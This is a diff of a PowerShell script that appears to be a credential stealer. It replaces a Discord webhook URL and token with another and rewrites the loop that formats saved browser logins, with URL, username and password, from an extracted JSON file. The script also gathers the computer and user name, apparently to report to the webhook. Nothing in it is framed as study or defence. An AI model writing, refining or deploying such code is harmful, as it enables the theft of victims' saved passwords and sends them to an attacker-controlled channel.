@@ -1,5 +1,5 @@
 # Discord Webhook
-$webhook = "https://discord.com/api/webhooks/1467172875529228422/3X57JscpSXinJkZzei7XYF1JVmRx6hfSzMGx9PXOgC0Aawp4fIeN1E37Bd4OAfSJIGO0"
+$webhook = "https://discord.com/api/webhooks/1467247495896895670/3AcT2XWey8Wi69lE52j_kW5SJK-GHKsNebUpB42sJO0ldLMhwU7QMMRLhquT6wPYMET3"
 
 # Get PC info
 $pc = "$env:COMPUTERNAME | $env:USERNAME"
@@ -45,7 +45,13 @@ try {
             $data = Get-Content $jsonFile.FullName | ConvertFrom-Json
             $browsers = ""
             foreach($item in $data) {
-                $browsers += "$($item.url)`n$($item.username):$($item.password)`n`n"
+                $url = if($item.LoginURL) { $item.LoginURL } else { "No URL" }
+                $user = if($item.UserName) { $item.UserName } else { "" }
+                $pass = if($item.Password) { $item.Password } else { "" }
+                
+                if($pass) {
+                    $browsers += "$url`nUser: $user`nPass: $pass`n`n"
+                }
             }
             if(-not $browsers) { $browsers = "No saved browser passwords found" }
         } else {
